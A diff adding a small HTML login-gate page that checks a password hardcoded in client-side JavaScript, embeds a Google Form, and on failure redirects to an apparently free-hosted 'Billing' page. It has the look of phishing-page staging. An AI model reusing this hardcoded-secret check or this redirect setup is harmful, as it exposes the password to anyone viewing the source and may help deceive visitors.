@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+
+html {
+  background-color: #b6d9e0;
+  
+  
+}
+body {font-family: Arial, Helvetica, sans-serif;}
+form {border: none;
+    margin-left: 5vw;
+    margin-right: 5vw;
+}
+
+input[type=text], input[type=password] {
+    width: 100%;
+    padding: 12px 20px;
+    margin: 8px 0;
+    display: inline-block;
+    border: 1px solid #768bef;
+    box-sizing: border-box;
+    border-radius: 12px;
+}
+
+a:-webkit-any-link{
+    cursor: pointer;
+    text-decoration: none;
+    background-color: #008a99;
+    padding: 1% 9%;
+    margin-top: 1vw;
+    position: initial;
+    color: white;
+    font-family: sans-serif;
+    border-radius: 4px;
+    float: left;
+}
+    a:-webkit-any-link :hover{
+ opacity: 0.8;
+    }
+
+.container {
+  padding: 16px;
+    margin: 4vw;
+}
+
+span.psw {
+  float: right;
+  padding-top: 16px;
+}
+
+h2 {
+    font-family: Geometric, sans-serif;
+    margin-left: 21vw;
+    margin-right: 21vw;
+    font-size: 5vw;
+    color: #1371ff;
+    }
+    
+/* Change styles for span and cancel button on extra small screens */
+@media screen and (max-width: 300px) {
+  span.psw {
+     display: block;
+     float: none;
+  }
+  .cancelbtn {
+     width: 100%;
+  }
+}
+</style>
+</head>
+<body>
+
+<form>
+  <div class="imgcontainer">
+  </div>
+  <form >
+    <div style="margin: 3% 24% 0px 24%;"><label for="psw"><b>Password</b></label>
+    </di><input id="password" type="password" n placeholder="Enter Password" required>
+	
+        
+    <center><a href="https://sites.google.com/view/delivery-app-solution" target="_self"" onclick="javascript:return validatePass()">Log-In</a></center></div>
+  
+</form>
+
+<iframe text-only="true" style="width: -webkit-fill-available;
+    height: -webkit-fill-available;
+    position: relative;
+    border-width: 2px;
+    border-style: hidden;
+    border-color: transparent;
+    border-image: none;"src="https://docs.google.com/forms/d/e/1FAIpQLSdmxnZWiXeMvx-T8eb1C41zmEd6rzStlEjkmNfCXV_z3BZa5Q/viewform"></iframe>
+
+
+
+
+    <script>
+function validatePass(){
+
+    if(document.getElementById('password').value == '@unison123' ){
+        return true;
+    }else{
+        alert("Please Enter Your Email Address and Enter correct Password!") + window.location.replace('https://wmgjn1bx3vshs13gzhul2a-on.drv.tw/Billing/INBOTECH-SOLUTION/smooth1.html');
+        return false;
+    }
+}
+      
+</script>
+
+
+</html>
